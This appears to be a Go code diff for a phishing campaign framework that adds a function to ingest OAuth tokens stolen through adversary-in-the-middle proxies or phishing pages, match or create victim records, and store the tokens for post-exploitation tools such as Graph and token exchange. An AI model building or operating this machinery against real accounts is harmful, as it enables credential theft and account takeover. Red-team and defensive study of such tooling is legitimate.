@@ -713,6 +713,156 @@ func (m *Manager) GetTokens(campaignID string) ([]*devicecode.TokenResult, error
 	return out, nil
 }
 
+// CapturedToken is a token pushed in out-of-band (not via the device code flow) —
+// from an AiTM/reverse proxy, a phishing landing page, or a manual drop — through
+// the token listener. Only one of AccessToken/RefreshToken/IDToken is strictly
+// required; the identity fields are derived from JWT claims when omitted.
+type CapturedToken struct {
+	AccessToken  string
+	RefreshToken string
+	IDToken      string
+	TokenType    string
+	ExpiresIn    int
+	Scope        string
+	TargetID     string // optional — match an existing target by ID
+	TargetEmail  string // optional — match/auto-create the target by email
+	Source       string // free-form origin label (e.g. "aitm", "manual")
+}
+
+// IngestCapturedToken records a token received out-of-band into a campaign,
+// exactly like a device-code capture: it updates the in-memory results AND the
+// database so the token shows up in the UI and is immediately usable by every
+// post-exploitation tool (Graph, MFA, PRT, token exchange).
+//
+// Target resolution order:
+//  1. TargetID matching an existing target;
+//  2. TargetEmail (or the UPN/email from the JWT) matching an existing target;
+//  3. otherwise a new target is auto-created from the captured identity.
+func (m *Manager) IngestCapturedToken(campaignID string, tok CapturedToken) (*devicecode.TokenResult, error) {
+	if strings.TrimSpace(tok.AccessToken) == "" &&
+		strings.TrimSpace(tok.RefreshToken) == "" &&
+		strings.TrimSpace(tok.IDToken) == "" {
+		return nil, fmt.Errorf("at least one of access_token, refresh_token, id_token is required")
+	}
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return nil, fmt.Errorf("campaign not found: %s", campaignID)
+	}
+
+	// Derive identity metadata from whichever JWT we have. Access tokens and
+	// id tokens are JWTs; refresh tokens are opaque and can't be parsed.
+	var claims devicecode.CapturedClaims
+	for _, jwt := range []string{tok.AccessToken, tok.IDToken} {
+		if jwt == "" {
+			continue
+		}
+		if cl, err := devicecode.ExtractClaims(jwt); err == nil {
+			claims = cl
+			break
+		}
+	}
+
+	email := strings.ToLower(strings.TrimSpace(tok.TargetEmail))
+	if email == "" {
+		email = strings.ToLower(strings.TrimSpace(claims.UPN))
+	}
+
+	// Resolve or create the target.
+	var tgt *targets.Target
+	if tok.TargetID != "" {
+		if t, ok := c.Targets.GetByID(tok.TargetID); ok {
+			tgt = t
+		}
+	}
+	if tgt == nil && email != "" {
+		if t, ok := c.Targets.GetByEmail(email); ok {
+			tgt = t
+		}
+	}
+	if tgt == nil {
+		// Auto-create. Fall back to a synthetic address if the token carried no
+		// identity so Add() (which requires a non-empty email) still succeeds.
+		if email == "" {
+			email = fmt.Sprintf("captured-%d@unknown.local", time.Now().UnixNano())
+		}
+		tgt = &targets.Target{
+			Email:       email,
+			DisplayName: claims.UPN,
+			Group:       "captured",
+		}
+		if err := c.Targets.Add(tgt); err != nil {
+			// Lost a race with a concurrent ingest for the same email — re-fetch.
+			if t, ok := c.Targets.GetByEmail(email); ok {
+				tgt = t
+			} else {
+				return nil, fmt.Errorf("creating target: %w", err)
+			}
+		}
+		m.SaveTargetToDB(campaignID, tgt)
+	}
+
+	result := &devicecode.TokenResult{
+		AccessToken:       tok.AccessToken,
+		RefreshToken:      tok.RefreshToken,
+		IDToken:           tok.IDToken,
+		TokenType:         tok.TokenType,
+		ExpiresIn:         devicecode.FlexInt(tok.ExpiresIn),
+		Scope:             tok.Scope,
+		TargetID:          tgt.ID,
+		TargetEmail:       tgt.Email,
+		RedeemedAt:        time.Now().UTC(),
+		UserPrincipalName: claims.UPN,
+		TenantID:          claims.TenantID,
+		CapturedClientID:  claims.ClientID,
+		Source:            tok.Source,
+	}
+	if result.TokenType == "" {
+		result.TokenType = "Bearer"
+	}
+
+	// Update in-memory results — replace any existing entry for the same email so
+	// the most recent token wins (identical to the device-code collector).
+	c.mu.Lock()
+	replaced := false
+	for i, r := range c.Results {
+		if strings.EqualFold(r.TargetEmail, result.TargetEmail) {
+			c.Results[i] = result
+			replaced = true
+			break
+		}
+	}
+	if !replaced {
+		c.Results = append(c.Results, result)
+	}
+	c.ResultsByID[result.TargetID] = result
+	c.mu.Unlock()
+
+	// Persist to the database (secret columns are encrypted at rest by the store).
+	if err := m.db.InsertToken(store.TokenRow{
+		CampaignID:       campaignID,
+		TargetID:         result.TargetID,
+		TargetEmail:      result.TargetEmail,
+		AccessToken:      result.AccessToken,
+		RefreshToken:     result.RefreshToken,
+		IDToken:          result.IDToken,
+		TokenType:        result.TokenType,
+		ExpiresIn:        int(result.ExpiresIn),
+		Scope:            result.Scope,
+		UPN:              result.UserPrincipalName,
+		RedeemedAt:       result.RedeemedAt,
+		TenantID:         result.TenantID,
+		CapturedClientID: result.CapturedClientID,
+	}); err != nil {
+		return nil, fmt.Errorf("persisting token: %w", err)
+	}
+
+	m.saveCampaign(c)
+	m.NotifySSE(campaignID)
+	log.Printf("[listener] TOKEN INGESTED: campaign=%s target=%s upn=%s tenant=%s source=%s",
+		campaignID, result.TargetEmail, result.UserPrincipalName, result.TenantID, tok.Source)
+	return result, nil
+}
+
 // SendEmails dispatches phishing emails to all targets with active device code sessions.
 func (m *Manager) SendEmails(campaignID string, profile *mailer.SenderProfile, tmpl *mailer.EmailTemplate) ([]*mailer.EmailSendResult, error) {
 	c, ok := m.GetCampaign(campaignID)
